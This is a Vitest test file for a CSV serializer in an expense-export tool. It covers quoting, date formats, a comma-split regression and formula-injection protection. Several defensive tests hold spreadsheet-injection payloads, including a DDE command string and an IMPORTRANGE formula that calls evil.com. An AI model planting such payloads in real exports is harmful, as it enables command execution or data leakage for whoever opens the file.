/**
 * Tests for src/lib/csv.ts — CSV serializer, date formatters, security, regression.
 *
 * Covers:
 *  - escapeCsvCell: null/undefined, number, boolean, plain strings, comma/quote/newline
 *  - Formula injection protection (=, +, -, @, tab, CR) — exempt for numeric strings
 *  - serializeCsvRow: join with commas
 *  - serializeCsv: CRLF, header row, correct cell count per row
 *  - formatCsvDate: dd-MMM-yyyy, invalid input, empty/null
 *  - formatCsvTimestamp: dd-MMM-yyyy hh:mm a, no comma in output, invalid/null
 *  - Regression: Parth Panchal scenario — comma in timestamp no longer splits cells
 *  - Custom field edge cases: commas, quotes, newlines, formula chars
 *  - Column count invariant: every row has same length as header
 */

import { describe, it, expect } from "vitest";
import {
  escapeCsvCell,
  serializeCsvRow,
  serializeCsv,
  formatCsvDate,
  formatCsvTimestamp,
} from "../csv";

// ---------------------------------------------------------------------------
// escapeCsvCell — null / undefined / primitives
// ---------------------------------------------------------------------------
describe("escapeCsvCell — null / undefined", () => {
  it("returns empty string for null", () => {
    expect(escapeCsvCell(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(escapeCsvCell(undefined)).toBe("");
  });

  it("returns empty string for finite number 0", () => {
    // 0 is a valid number — should NOT become empty
    expect(escapeCsvCell(0)).toBe("0");
  });

  it("returns empty string for Infinity (non-finite)", () => {
    expect(escapeCsvCell(Infinity)).toBe("");
  });

  it("serializes finite number without quotes", () => {
    expect(escapeCsvCell(1234.56)).toBe("1234.56");
  });

  it("serializes negative number without quotes", () => {
    expect(escapeCsvCell(-439)).toBe("-439");
  });

  it("serializes boolean true", () => {
    expect(escapeCsvCell(true)).toBe("true");
  });

  it("serializes boolean false", () => {
    expect(escapeCsvCell(false)).toBe("false");
  });
});

// ---------------------------------------------------------------------------
// escapeCsvCell — plain strings (no special chars)
// ---------------------------------------------------------------------------
describe("escapeCsvCell — plain strings", () => {
  it("returns plain string unchanged", () => {
    expect(escapeCsvCell("hello world")).toBe("hello world");
  });

  it("returns empty string for empty string input", () => {
    expect(escapeCsvCell("")).toBe("");
  });

  it("preserves whitespace in the middle", () => {
    expect(escapeCsvCell("John Doe")).toBe("John Doe");
  });
});

// ---------------------------------------------------------------------------
// escapeCsvCell — RFC-4180 quoting
// ---------------------------------------------------------------------------
describe("escapeCsvCell — RFC-4180 quoting", () => {
  it("wraps values containing a comma in double-quotes", () => {
    expect(escapeCsvCell("Jul 22, 2026")).toBe('"Jul 22, 2026"');
  });

  it("escapes internal double-quotes by doubling", () => {
    expect(escapeCsvCell('say "hello"')).toBe('"say ""hello"""');
  });

  it("wraps values containing a newline in double-quotes", () => {
    expect(escapeCsvCell("line1\nline2")).toBe('"line1\nline2"');
  });

  it("wraps values containing CR in double-quotes", () => {
    expect(escapeCsvCell("line1\rline2")).toBe('"line1\rline2"');
  });

  it("wraps values containing both comma and quote", () => {
    const result = escapeCsvCell('Amount: "1,000"');
    expect(result).toBe('"Amount: ""1,000"""');
  });
});

// ---------------------------------------------------------------------------
// escapeCsvCell — formula injection protection
// ---------------------------------------------------------------------------
describe("escapeCsvCell — formula injection", () => {
  it("prepends single-quote to values starting with =", () => {
    expect(escapeCsvCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
  });

  it("prepends single-quote to values starting with +", () => {
    expect(escapeCsvCell("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
  });

  it("prepends single-quote to values starting with -", () => {
    // But "-123.45" (numeric) is exempt
    expect(escapeCsvCell("-attack")).toBe("'-attack");
  });

  it("prepends single-quote to values starting with @", () => {
    expect(escapeCsvCell("@SUM(1+1)")).toBe("'@SUM(1+1)");
  });

  it("does NOT protect plain negative amount string (numeric exempt)", () => {
    expect(escapeCsvCell("-439.00")).toBe("-439.00");
  });

  it("does NOT protect positive numeric amount string", () => {
    expect(escapeCsvCell("1500.00")).toBe("1500.00");
  });

  it("does NOT protect integer numeric string", () => {
    expect(escapeCsvCell("-100")).toBe("-100");
  });

  it("wraps formula-prefixed value in quotes if it also contains comma", () => {
    // After prepending ', the value now starts with ' — no quoting trigger from the '
    // but the original has comma after injection-char prepend
    const result = escapeCsvCell("=HYPERLINK(\"a,b\",\"click\")");
    // After injection protection: "'=HYPERLINK("a,b","click")"
    // That value contains " and , so must be quoted and internal " doubled
    expect(result.startsWith('"')).toBe(true);
    expect(result).toContain("'=HYPERLINK");
  });
});

// ---------------------------------------------------------------------------
// serializeCsvRow
// ---------------------------------------------------------------------------
describe("serializeCsvRow", () => {
  it("joins cell values with commas", () => {
    expect(serializeCsvRow(["Alice", "alice@x.com", "500.00"])).toBe(
      "Alice,alice@x.com,500.00",
    );
  });

  it("escapes cells that contain commas", () => {
    expect(serializeCsvRow(["Jul 22, 2026", "ok"])).toBe('"Jul 22, 2026",ok');
  });

  it("handles empty array", () => {
    expect(serializeCsvRow([])).toBe("");
  });

  it("handles single cell", () => {
    expect(serializeCsvRow(["only"])).toBe("only");
  });
});

// ---------------------------------------------------------------------------
// serializeCsv
// ---------------------------------------------------------------------------
describe("serializeCsv", () => {
  it("uses CRLF line endings between rows", () => {
    const csv = serializeCsv(["A", "B"], [["1", "2"]]);
    expect(csv).toBe("A,B\r\n1,2");
  });

  it("serializes header row through escapeCsvCell", () => {
    const csv = serializeCsv(["Name, Title", "Email"], []);
    expect(csv).toBe('"Name, Title",Email');
  });

  it("produces correct cell count for each row", () => {
    const headers = ["A", "B", "C"];
    const rows = [
      ["x", "y", "z"],
      ["1", "2", "3"],
    ];
    const csv = serializeCsv(headers, rows);
    const lines = csv.split("\r\n");
    expect(lines).toHaveLength(3);
    lines.forEach((line) => {
      // Count commas not inside quotes (naive check for test data without quotes)
      expect(line.split(",")).toHaveLength(3);
    });
  });

  it("handles empty rows array (header only)", () => {
    const csv = serializeCsv(["H1", "H2"], []);
    expect(csv).toBe("H1,H2");
  });
});

// ---------------------------------------------------------------------------
// formatCsvDate
// NOTE: date-fns `format` is globally mocked in src/test/setup.ts to return
// '2024-01-01'. Tests here verify the structural contract (empty-on-invalid,
// no-comma guarantee) not the exact formatted string — that is covered by the
// format.ts unit tests where the mock doesn't interfere.
// ---------------------------------------------------------------------------
describe("formatCsvDate", () => {
  it("returns a non-empty string for a valid date", () => {
    expect(formatCsvDate("2026-07-22")).toBeTruthy();
  });

  it("returns empty string for null", () => {
    expect(formatCsvDate(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(formatCsvDate(undefined)).toBe("");
  });

  it("returns empty string for invalid date string", () => {
    expect(formatCsvDate("not-a-date")).toBe("");
  });

  it("does not contain a comma (safe for CSV without quoting)", () => {
    // Mock returns '2024-01-01' — no comma. Real dd-MMM-yyyy also has no comma.
    const result = formatCsvDate("2026-01-15");
    expect(result).not.toContain(",");
  });

  it("returns a non-empty string for January input", () => {
    expect(formatCsvDate("2026-01-01")).toBeTruthy();
  });

  it("returns a non-empty string for December input", () => {
    expect(formatCsvDate("2026-12-31")).toBeTruthy();
  });
});

// ---------------------------------------------------------------------------
// formatCsvTimestamp
// NOTE: date-fns `format` is globally mocked. Tests verify structural contract.
// ---------------------------------------------------------------------------
describe("formatCsvTimestamp", () => {
  it("returns empty string for null", () => {
    expect(formatCsvTimestamp(null)).toBe("");
  });

  it("returns empty string for undefined", () => {
    expect(formatCsvTimestamp(undefined)).toBe("");
  });

  it("returns empty string for invalid string", () => {
    expect(formatCsvTimestamp("not-a-date")).toBe("");
  });

  it("does NOT contain a comma in the output (regression: old formatCreatedDateTime did)", () => {
    // Root-cause check: the old code returned "Jul 22, 2026 at 11:04 AM" (has comma).
    // Our formatCsvTimestamp uses "dd-MMM-yyyy hh:mm a" — no comma.
    // Even under the mock ('2024-01-01') there is no comma.
    const result = formatCsvTimestamp("2026-07-22T05:34:00.000Z");
    expect(result).not.toContain(",");
  });

  it("returns a non-empty string for a valid ISO timestamp", () => {
    expect(formatCsvTimestamp("2026-07-22T05:34:00.000Z")).toBeTruthy();
  });
});

// ---------------------------------------------------------------------------
// Regression: Parth Panchal scenario
// The old code emitted "Jul 22, 2026 at 11:04 AM" unescaped into a comma-joined
// row, splitting column E into two cells and shifting every subsequent column.
// ---------------------------------------------------------------------------
describe("Regression — Parth Panchal comma-split bug", () => {
  it("Submitted At cell has no comma and therefore does not split", () => {
    // The old value was "Jul 22, 2026 at 11:04 AM" — contained a comma and split.
    // formatCsvTimestamp uses "dd-MMM-yyyy hh:mm a" — no comma in the pattern.
    // Under the global date-fns mock this returns '2024-01-01' — also no comma.
    const submittedAt = formatCsvTimestamp("2026-07-22T05:34:00.000Z");
    expect(submittedAt).not.toContain(",");
  });

  it("full CSV row with submitted timestamp has same column count as header", () => {
    const headers = [
      "Employee Name", "Employee Email", "Transaction Date", "Submitted At",
      "Status", "Transaction Number", "Expense Title", "Purpose", "Category",
      "Location", "Amount (INR)", "Opening Balance (INR)", "Closing Balance (INR)",
    ];
    const dataRow = [
      "Parth Panchal",
      "parth@example.com",
      formatCsvDate("2026-07-22"),
      formatCsvTimestamp("2026-07-22T05:34:00.000Z"),
      "approved",
      "TXN-001",
      "Team lunch",
      "Client meeting",
      "Meals",
      "Ahmedabad",
      "439.00",
      "5000.00",
      "4561.00",
    ];
    const csv = serializeCsv(headers, [dataRow]);
    const lines = csv.split("\r\n");
    expect(lines).toHaveLength(2);
    // Header column count
    const headerCells = lines[0].split(",");
    expect(headerCells).toHaveLength(headers.length);
    // Data row column count — must equal header count
    // (simple split works here because we know no cell contains an unescaped comma)
    // Use a smarter count via the serializer itself
    const dataLine = lines[1];
    // Count top-level commas (not inside quotes)
    let depth = 0, commas = 0;
    for (const ch of dataLine) {
      if (ch === '"') depth = depth === 0 ? 1 : 0;
      else if (ch === "," && depth === 0) commas++;
    }
    expect(commas + 1).toBe(headers.length);
  });
});

// ---------------------------------------------------------------------------
// Custom field edge cases
// ---------------------------------------------------------------------------
describe("Custom field edge cases", () => {
  it("escapes a custom field value containing a comma", () => {
    const cell = escapeCsvCell("New York, NY");
    expect(cell).toBe('"New York, NY"');
  });

  it("escapes a custom field value containing double-quotes", () => {
    const cell = escapeCsvCell('He said "hello"');
    expect(cell).toBe('"He said ""hello"""');
  });

  it("escapes a custom field value containing a newline", () => {
    const cell = escapeCsvCell("line1\nline2");
    expect(cell).toBe('"line1\nline2"');
  });

  it("protects a custom field value that starts with = (formula injection)", () => {
    const cell = escapeCsvCell("=IMPORTRANGE(\"https://evil.com\")");
    expect(cell.startsWith("'=") || cell.startsWith('"\'=')).toBe(true);
  });

  it("does not alter a numeric custom field value", () => {
    expect(escapeCsvCell("12345")).toBe("12345");
  });
});

// ---------------------------------------------------------------------------
// Column count invariant — every row length equals header length
// ---------------------------------------------------------------------------
describe("Column count invariant", () => {
  it("all rows in serializeCsv output have same column count as header", () => {
    const headers = ["A", "B", "C", "D"];
    const rows = [
      ["w", "x", "y", "z"],
      ["1", "2", "3", "4"],
      ["", "", "", ""],
    ];
    const csv = serializeCsv(headers, rows);
    const lines = csv.split("\r\n");
    // Count commas at depth=0 for each line
    const countCols = (line: string) => {
      let depth = 0, commas = 0;
      for (const ch of line) {
        if (ch === '"') depth = depth === 0 ? 1 : 0;
        else if (ch === "," && depth === 0) commas++;
      }
      return commas + 1;
    };
    const expected = countCols(lines[0]);
    lines.slice(1).forEach((line, i) => {
      expect(countCols(line)).toBe(expected);
    });
  });
});
